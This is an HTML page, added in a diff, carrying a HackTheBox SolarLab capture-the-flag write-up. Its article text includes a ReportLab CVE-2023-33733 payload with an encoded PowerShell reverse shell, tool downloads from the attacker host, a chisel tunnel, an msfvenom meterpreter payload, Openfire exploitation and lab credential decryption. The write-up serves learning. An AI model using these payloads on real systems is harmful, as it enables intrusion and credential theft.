@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SolarLab Writeup - HackTheBox | Rezy Dev</title>
+<meta name="keywords" content="HackTheBox, Windows, Medium">
+<meta name="description" content="SolarLab is a medium Windows machine leveraging guest SMB access to extract creds, then exploiting ReportLab CVE-2023-33733 for RCE as blake. Local Openfire is then exploited via CVE-2023-32315 for code execution, with log analysis revealing reused Administrator credentials for full access.">
+<meta name="author" content="Me">
+<link rel="canonical" href="http://localhost:1313/writeups/hackthebox/solarlab/">
+<meta name="google-site-verification" content="XYZabc">
+<meta name="yandex-verification" content="XYZabc">
+<meta name="msvalidate.01" content="XYZabc">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.c8cc592602af07182c5c77ec685d5a345edaf450c20eb609706f559cb037baef.css" integrity="sha256-yMxZJgKvBxgsXHfsaF1aNF7a9FDCDrYJcG9VnLA3uu8=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/hackthebox/solarlab/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript><style>
+    @media screen and (min-width: 769px) {
+         
+        .post-content input[type="checkbox"]:checked ~ label > img {
+            transform: scale(1.6);
+            cursor: zoom-out;
+            position: relative;
+            z-index: 999;
+        }
+    
+        .post-content img.zoomCheck {
+            transition: transform 0.15s ease;
+            z-index: 999;
+            cursor: zoom-in;
+        }
+    }
+    </style><meta property="og:url" content="http://localhost:1313/writeups/hackthebox/solarlab/">
+  <meta property="og:site_name" content="Rezy Dev">
+  <meta property="og:title" content="SolarLab Writeup - HackTheBox">
+  <meta property="og:description" content="SolarLab is a medium Windows machine leveraging guest SMB access to extract creds, then exploiting ReportLab CVE-2023-33733 for RCE as blake. Local Openfire is then exploited via CVE-2023-32315 for code execution, with log analysis revealing reused Administrator credentials for full access.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:published_time" content="2024-09-24T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-09-24T00:00:00+00:00">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Windows">
+    <meta property="article:tag" content="Medium">
+    <meta property="og:image" content="http://localhost:1313/feature.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://localhost:1313/feature.png">
+<meta name="twitter:title" content="SolarLab Writeup - HackTheBox">
+<meta name="twitter:description" content="SolarLab is a medium Windows machine leveraging guest SMB access to extract creds, then exploiting ReportLab CVE-2023-33733 for RCE as blake. Local Openfire is then exploited via CVE-2023-32315 for code execution, with log analysis revealing reused Administrator credentials for full access.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "http://localhost:1313/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "HackTheBox",
+      "item": "http://localhost:1313/writeups/hackthebox/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "SolarLab Writeup - HackTheBox",
+      "item": "http://localhost:1313/writeups/hackthebox/solarlab/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SolarLab Writeup - HackTheBox",
+  "name": "SolarLab Writeup - HackTheBox",
+  "description": "SolarLab is a medium Windows machine leveraging guest SMB access to extract creds, then exploiting ReportLab CVE-2023-33733 for RCE as blake. Local Openfire is then exploited via CVE-2023-32315 for code execution, with log analysis revealing reused Administrator credentials for full access.",
+  "keywords": [
+    "HackTheBox", "Windows", "Medium"
+  ],
+  "articleBody": " Link: https://app.hackthebox.com/machines/SolarLab Difficulty Medium Machine Windows Enumeration Nmap\nI ran nmap 10.10.11.16 -vv -p- -T4 first to see all available ports on this box. I checked port 80 (the verbose flag showed us that port 80 was already open) while I waited for the scan to complete. I visited the site after adding 10.10.11.16 solarlab.htb to the /etc/hosts file. This is what the website looks like.\nAs the nmap finished scanning all ports, here are the open ports on this box:\nPORT STATE SERVICE REASON 80/tcp open http syn-ack 135/tcp open msrpc syn-ack 139/tcp open netbios-ssn syn-ack 445/tcp open microsoft-ds syn-ack 6791/tcp open hnm syn-ack I will perform an aggressive scan on these ports using the command: nmap 10.10.11.16 -vv -p80,135,139,445,6791 -T4 -A.\nPORT STATE SERVICE REASON VERSION 80/tcp open http syn-ack nginx 1.24.0 |_http-title: SolarLab Instant Messenger |_http-server-header: nginx/1.24.0 | http-methods: |_ Supported Methods: GET HEAD 135/tcp open msrpc syn-ack Microsoft Windows RPC 139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? syn-ack 6791/tcp open http syn-ack nginx 1.24.0 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: nginx/1.24.0 |_http-title: Did not follow redirect to http://report.solarlab.htb:6791/ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | p2p-conficker: I attempted to use the ‘send contact’ feature to test if we could inject XSS from here, but it initially utilized a GET request. Changing it to a POST request didn’t enable us to perform any actions.\nAs Nmap suggested that the supported methods were GET and HEAD, I used a HEAD request, which actually worked as intended.\nUser Flag Nothing seems to be working here, including XSS, SQLi, etc. For now, I will explore another port. I ran smbclient //10.10.11.16/Documents -U Guest, which actually worked and logged me in.\n┌──(root㉿kali)-[/HTB/SolarLab] └─# smbclient //10.10.11.16/Documents -U Guest Password for [WORKGROUP\\Guest]: Try \"help\" to get a list of possible commands. smb: \\\u003e ls . DR 0 Fri Apr 26 10:47:14 2024 .. DR 0 Fri Apr 26 10:47:14 2024 concepts D 0 Fri Apr 26 10:41:57 2024 desktop.ini AHS 278 Fri Nov 17 05:54:43 2023 details-file.xlsx A 12793 Fri Nov 17 07:27:21 2023 My Music DHSrn 0 Thu Nov 16 14:36:51 2023 My Pictures DHSrn 0 Thu Nov 16 14:36:51 2023 My Videos DHSrn 0 Thu Nov 16 14:36:51 2023 old_leave_request_form.docx A 37194 Fri Nov 17 05:35:57 2023 7779839 blocks of size 4096. 1800663 blocks available smb: \\\u003e get details-file.xlsx getting file \\details-file.xlsx of size 12793 as details-file.xlsx (35.2 KiloBytes/sec) (average 35.2 KiloBytes/sec) smb: \\\u003e gvet old_leave_request_form.docx gvet: command not found smb: \\\u003e get old_leave_request_form.docx getting file \\old_leave_request_form.docx of size 37194 as old_leave_request_form.docx (45.7 KiloBytes/sec) (average 42.4 KiloBytes/sec) smb: \\\u003e cd concepts smb: \\concepts\\\u003e ls . D 0 Fri Apr 26 10:41:57 2024 .. D 0 Fri Apr 26 10:41:57 2024 Training-Request-Form.docx A 161337 Fri Nov 17 05:46:57 2023 Travel-Request-Sample.docx A 30953 Fri Nov 17 05:36:54 2023 7779839 blocks of size 4096. 1800276 blocks available I retrieved all the important files to see if there was anything interesting among them.\nOut of all the files, details-file.xlsx contained some useful information, such as passwords and emails. I took note of the usernames and passwords.\nNext, I visited port 6791, which had an HTTP service running on it. It redirected me to the report.solarlab.htb subdomain, which has a login page for ReportHub.\n“I tried brute-forcing the username and password fields using the credentials we found earlier with Burp Intruder. The following credentials worked: BlakeB:ThisCanB3typedeasily1@\nI did some research on ReportHub and found a CVE related to it: CVE-2023-33733.\nHere is the exploit code:\nexploit I used this request in the travel_request parameter of the /travelApprovalForm endpoint.”\nAnd I got the user flag\nPS C:\\Users\\blake\\Desktop\u003e cat user.txt USERFLAG_REDACTED_HTB Root Flag I sent winPEAS.exe to the Windows box using the following command:\nInvoke-WebRequest \"http://10.10.14.3/winPEASx86.exe\" -OutFile \"winpeasS.exe\" (make sure the HTTP server is running).\nThen I ran .\\winpeasS.exe to execute it.\nFrom the output, I discovered that there is another user named openfire (in addition to Blake, admin accounts, and service accounts) on this machine. Additionally, winPEAS revealed that Openfire is running on port 9090.\nNext, I used Chisel to set up port forwarding.\nI ran chisel server -p 8000 --reverse on my Kali machine.\nThen, on the target machine, logged in as user Blake, I executed:\n.\\chisel.exe client 10.10.14.3:8000 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091 (I transferred the Chisel executable to the target machine using Invoke-WebRequest \"http://10.10.14.3/chisel.exe\" -OutFile \"chisel.exe\" before running it).\nAfter port forwarding with Chisel, I accessed localhost:9090 and found an Openfire 4.7.4 admin console. This version has a known CVE, and an exploit is available in Metasploit.\nHere’s the exploit I used for Openfire 4.7.4\nI used exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315 to exploit the openfire.\nAlthough it didn’t create a session for us, it did create an admin user, which allowed us to log in to the application.\nI downloaded openfire-management-tool-plugin.jar from this GitHub repository.\nThen, I uploaded it in the Plugins tab. To do this, I changed the uploadsuccess=false to true in order to successfully upload our plugin. By default, the uploadsuccess parameter is set to false, which prevents the upload. I changed it to true to successfully upload the plugin.\nAfter uploading the plugin, navigate to Server \u003e Server Settings \u003e Management Tool. Set the password as ‘123’, then select ‘System Command’.\nWe found a shell execution point. I decided to execute a payload similar to the one used previously. I generated the payload from the same website I used before. Then, I launched nc and started listening on port 6565 to receive the reverse shell. Finally, I executed the PowerShell reverse shell payload from the website.\nAfter executing the command, I gained shell access for the user solarlab\\openfire.\nI discovered interesting credentials within the openfire.script file located at the PS C:\\Program Files\\Openfire\\embedded-db\\ directory.\n// NOTE: ONLY IMPORTANT DETAILS EXTRACTED FRROM THE SCRIPT IS SHOWN BELOW CREATE USER SA PASSWORD DIGEST 'd41d8cd98f00b204e9800998ecf8427e' INSERT INTO OFPROPERTY VALUES('passwordKey','hGXiFzsKaAeYLjn',0,NULL) INSERT INTO OFUSER VALUES('admin','gjMoswpK+HakPdvLIvp6eLKlYh0=','9MwNQcJ9bF4YeyZDdns5gvXp620=','yidQk5Skw11QJWTBAloAb28lYHftqa0x',4096,NULL,'becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442','Administrator','admin@solarlab.htb','001700223740785','0') I received an encrypted password and a passkey. To decrypt the password, I used them together with https://github.com/c0rdis/openfire_decrypt. Following the instructions, I compiled the JAR file:\njavac OpenFireDecryptPass.java This command compiled the JAR file. To crack the hash, I executed:\njava OpenFireDecryptPass becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442 hGXiFzsKaAeYLjn In this command, the first argument is the encrypted password, and the second one is the passkey. Through this process, I successfully cracked the hashes, revealing the credentials:\nAdministrator:ThisPasswordShouldDo!@\nNow, I am armed with these credentials.\nI installed sudo wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip on my Kali machine and then transferred the .exe file inside the zip to my target machine using Invoke-WebRequest \"http://10.10.14.3:8888/RunasCs.exe\" -OutFile \"runascs.exe\". After that, I created a payload with msfvenom: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=9898 -f exe -o shell.exe and then sent the shell.exe file to the target machine using: Invoke-WebRequest \"http://10.10.14.3/shell.exe\" -OutFile \"shell.exe\".\nNow that I have both of the .exe files on my target machine, I will use the multi/handler in Metasploit to capture the shell.\nTo set up the multi/handler, I ran these commands sequentially:\nmsfconsole use multi/handler set payload windows/x64/meterpreter/reverse_tcp set lhost tun0 set lport 9898 run After that, I went to my target machine and executed the command: .\\runascs.exe Administrator ThisPasswordShouldDo!@ shell.exe\nUpon running the above code, I observed that the meterpreter shell popped up, and I gained administrator access. 🙂\nWe rooted this box! Yay!\nConclusion Thanks for following my writeup on this box. I hope you learned something new from my methodology.\n",
+  "wordCount" : "1279",
+  "inLanguage": "en",
+  "image":"http://localhost:1313/feature.png","datePublished": "2024-09-24T00:00:00Z",
+  "dateModified": "2024-09-24T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Me"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/writeups/hackthebox/solarlab/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Rezy Dev",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="rezydev.xyz (Alt + H)">rezydev.xyz</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/about/" title="👨🏼‍💻 About">
+                    <span>👨🏼‍💻 About</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/writeups/" title="✍️ Writeups">
+                    <span>✍️ Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="📂 Archives">
+                    <span>📂 Archives</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="🏷️ Tags">
+                    <span>🏷️ Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="🔍 Search (Alt &#43; /)" accesskey=/>
+                    <span>🔍 Search</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/">Writeups</a>&nbsp;»&nbsp;<a href="http://localhost:1313/writeups/hackthebox/">HackTheBox</a></div>
+    <h1 class="post-title entry-hint-parent">
+      SolarLab Writeup - HackTheBox
+    </h1>
+    <div class="post-description">
+      SolarLab is a medium Windows machine leveraging guest SMB access to extract creds, then exploiting ReportLab CVE-2023-33733 for RCE as blake. Local Openfire is then exploited via CVE-2023-32315 for code execution, with log analysis revealing reused Administrator credentials for full access.
+    </div>
+    <div class="post-meta"><span title='2024-09-24 00:00:00 +0000 UTC'>September 24, 2024</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;1279 words&nbsp;·&nbsp;Me&nbsp;|&nbsp;<a href="https://github.com/Rezy-Dev/Rezy-Dev.github.io/tree/master/content/writeups/HackTheBox/SolarLab/index.md" rel="noopener noreferrer" target="_blank">Suggest Changes</a>
+
+</div>
+  </header> 
+<figure class="entry-cover">
+            <img loading="eager" src="http://localhost:1313/writeups/hackthebox/solarlab/feature.png" alt="">
+        
+</figure><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#user-flag">User Flag</a></li>
+    <li><a href="#root-flag">Root Flag</a></li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><table>
+  <thead>
+      <tr>
+          <th>Link:</th>
+          <th><a href="https://app.hackthebox.com/machines/SolarLab">https://app.hackthebox.com/machines/SolarLab</a></th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Difficulty</td>
+          <td>Medium</td>
+      </tr>
+      <tr>
+          <td>Machine</td>
+          <td>Windows</td>
+      </tr>
+  </tbody>
+</table>
+<hr>
+<h2 id="enumeration">Enumeration<a hidden class="anchor" aria-hidden="true" href="#enumeration">#</a></h2>
+<p><strong>Nmap</strong></p>
+<p>I ran <strong><code>nmap 10.10.11.16 -vv -p- -T4</code></strong> first to see all available ports on this box. I checked port 80 (the verbose flag showed us that port 80 was already open) while I waited for the scan to complete. I visited the site after adding <strong><code>10.10.11.16 solarlab.htb</code></strong> to the <strong><code>/etc/hosts</code></strong> file. This is what the website looks like.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-38a48" hidden>
+    <label for="zoomCheck-38a48">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled.png" alt="Untitled" 
+             />
+    </label></p>
+<p>As the nmap finished scanning all ports, here are the open ports on this box:</p>
+<pre tabindex="0"><code>PORT     STATE SERVICE      REASON
+80/tcp   open  http         syn-ack
+135/tcp  open  msrpc        syn-ack
+139/tcp  open  netbios-ssn  syn-ack
+445/tcp  open  microsoft-ds syn-ack
+6791/tcp open  hnm          syn-ack
+</code></pre><p>I will perform an aggressive scan on these ports using the command: <strong><code>nmap 10.10.11.16 -vv -p80,135,139,445,6791 -T4 -A</code></strong>.</p>
+<pre tabindex="0"><code>PORT     STATE SERVICE       REASON  VERSION
+80/tcp   open  http          syn-ack nginx 1.24.0
+|_http-title: SolarLab Instant Messenger
+|_http-server-header: nginx/1.24.0
+| http-methods: 
+|_  Supported Methods: GET HEAD
+135/tcp  open  msrpc         syn-ack Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds? syn-ack
+6791/tcp open  http          syn-ack nginx 1.24.0
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: nginx/1.24.0
+|_http-title: Did not follow redirect to http://report.solarlab.htb:6791/
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| p2p-conficker: 
+</code></pre><p>I attempted to use the &lsquo;send contact&rsquo; feature to test if we could inject XSS from here, but it initially utilized a GET request. Changing it to a POST request didn’t enable us to perform any actions.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-e8081" hidden>
+    <label for="zoomCheck-e8081">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%201.png" alt="Untitled" 
+             />
+    </label></p>
+<p>As Nmap suggested that the supported methods were GET and HEAD, I used a HEAD request, which actually worked as intended.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-c7a2a" hidden>
+    <label for="zoomCheck-c7a2a">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%202.png" alt="Untitled" 
+             />
+    </label></p>
+<h2 id="user-flag">User Flag<a hidden class="anchor" aria-hidden="true" href="#user-flag">#</a></h2>
+<p>Nothing seems to be working here, including XSS, SQLi, etc. For now, I will explore another port. I ran <strong><code>smbclient //10.10.11.16/Documents -U Guest</code></strong>, which actually worked and logged me in.</p>
+<pre tabindex="0"><code>┌──(root㉿kali)-[/HTB/SolarLab]
+└─# smbclient //10.10.11.16/Documents -U Guest
+Password for [WORKGROUP\Guest]:
+Try &#34;help&#34; to get a list of possible commands.
+smb: \&gt; ls
+  .                                  DR        0  Fri Apr 26 10:47:14 2024
+  ..                                 DR        0  Fri Apr 26 10:47:14 2024
+  concepts                            D        0  Fri Apr 26 10:41:57 2024
+  desktop.ini                       AHS      278  Fri Nov 17 05:54:43 2023
+  details-file.xlsx                   A    12793  Fri Nov 17 07:27:21 2023
+  My Music                        DHSrn        0  Thu Nov 16 14:36:51 2023
+  My Pictures                     DHSrn        0  Thu Nov 16 14:36:51 2023
+  My Videos                       DHSrn        0  Thu Nov 16 14:36:51 2023
+  old_leave_request_form.docx         A    37194  Fri Nov 17 05:35:57 2023
+
+                7779839 blocks of size 4096. 1800663 blocks available
+smb: \&gt; get details-file.xlsx
+getting file \details-file.xlsx of size 12793 as details-file.xlsx (35.2 KiloBytes/sec) (average 35.2 KiloBytes/sec)
+smb: \&gt; gvet old_leave_request_form.docx
+gvet: command not found
+smb: \&gt; get old_leave_request_form.docx
+getting file \old_leave_request_form.docx of size 37194 as old_leave_request_form.docx (45.7 KiloBytes/sec) (average 42.4 KiloBytes/sec)
+smb: \&gt; cd concepts
+smb: \concepts\&gt; ls
+  .                                   D        0  Fri Apr 26 10:41:57 2024
+  ..                                  D        0  Fri Apr 26 10:41:57 2024
+  Training-Request-Form.docx          A   161337  Fri Nov 17 05:46:57 2023
+  Travel-Request-Sample.docx          A    30953  Fri Nov 17 05:36:54 2023
+
+                7779839 blocks of size 4096. 1800276 blocks available
+</code></pre><p>I retrieved all the important files to see if there was anything interesting among them.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-cf7b2" hidden>
+    <label for="zoomCheck-cf7b2">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%203.png" alt="Untitled" 
+             />
+    </label></p>
+<p>Out of all the files, <strong><code>details-file.xlsx</code></strong> contained some useful information, such as passwords and emails. I took note of the usernames and passwords.</p>
+<p>Next, I visited port 6791, which had an HTTP service running on it. It redirected me to the <strong><code>report.solarlab.htb</code></strong> subdomain, which has a login page for ReportHub.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-acde7" hidden>
+    <label for="zoomCheck-acde7">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%204.png" alt="Untitled" 
+             />
+    </label></p>
+<p>&ldquo;I tried brute-forcing the username and password fields using the credentials we found earlier with Burp Intruder. The following credentials worked: <code>BlakeB:ThisCanB3typedeasily1@</code></p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-91bdb" hidden>
+    <label for="zoomCheck-91bdb">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%205.png" alt="Untitled" 
+             />
+    </label></p>
+<p>I did some research on ReportHub and found a CVE related to it: <a href="https://github.com/c53elyas/CVE-2023-33733">CVE-2023-33733</a>.</p>
+<p>Here is the exploit code:</p>
+<pre tabindex="0"><code>&lt;p&gt;&lt;font color=&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMwAiACwANwA3ADkAOQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;&gt;
+exploit
+&lt;/font&gt;&lt;/p&gt;
+</code></pre><p>I used this request in the <strong><code>travel_request</code></strong> parameter of the <strong><code>/travelApprovalForm</code></strong> endpoint.&rdquo;</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-9c09b" hidden>
+    <label for="zoomCheck-9c09b">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%206.png" alt="Untitled" 
+             />
+    </label></p>
+<p>And I got the user flag</p>
+<pre tabindex="0"><code>PS C:\Users\blake\Desktop&gt; cat user.txt
+USERFLAG_REDACTED_HTB
+</code></pre><h2 id="root-flag">Root Flag<a hidden class="anchor" aria-hidden="true" href="#root-flag">#</a></h2>
+<p>I sent <strong><code>winPEAS.exe</code></strong> to the Windows box using the following command:</p>
+<p><strong><code>Invoke-WebRequest &quot;http://10.10.14.3/winPEASx86.exe&quot; -OutFile &quot;winpeasS.exe&quot;</code></strong> (make sure the HTTP server is running).</p>
+<p>Then I ran <strong><code>.\winpeasS.exe</code></strong> to execute it.</p>
+<p>From the output, I discovered that there is another user named <strong><code>openfire</code></strong> (in addition to Blake, admin accounts, and service accounts) on this machine. Additionally, winPEAS revealed that Openfire is running on port 9090.</p>
+<p>Next, I used Chisel to set up port forwarding.</p>
+<p>I ran <strong><code>chisel server -p 8000 --reverse</code></strong> on my Kali machine.</p>
+<p>Then, on the target machine, logged in as user Blake, I executed:</p>
+<p><strong><code>.\chisel.exe client 10.10.14.3:8000 R:9090:127.0.0.1:9090 R:9091:127.0.0.1:9091</code></strong> (I transferred the Chisel executable to the target machine using <strong><code>Invoke-WebRequest &quot;http://10.10.14.3/chisel.exe&quot; -OutFile &quot;chisel.exe&quot;</code></strong> before running it).</p>
+<p>After port forwarding with Chisel, I accessed <strong><code>localhost:9090</code></strong> and found an Openfire 4.7.4 admin console. This version has a known CVE, and an exploit is available in Metasploit.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-27e7f" hidden>
+    <label for="zoomCheck-27e7f">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%207.png" alt="Untitled" 
+             />
+    </label></p>
+<p>Here&rsquo;s the exploit I used for Openfire 4.7.4</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-b719f" hidden>
+    <label for="zoomCheck-b719f">
+        <img class="zoomCheck" loading="lazy" decoding="async" 
+            src="SolarLab%2069d4bb6c390444d887e92767e434311b/Untitled%208.png" alt="Untitled" 
+             />
+    </label></p>
+<p>I used <code>exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315</code> to exploit the openfire.</p>
+<p>
+    
+    <input type="checkbox" id="zoomCheck-abb71" hidden>
+    <label for="zoomCheck-abb71">
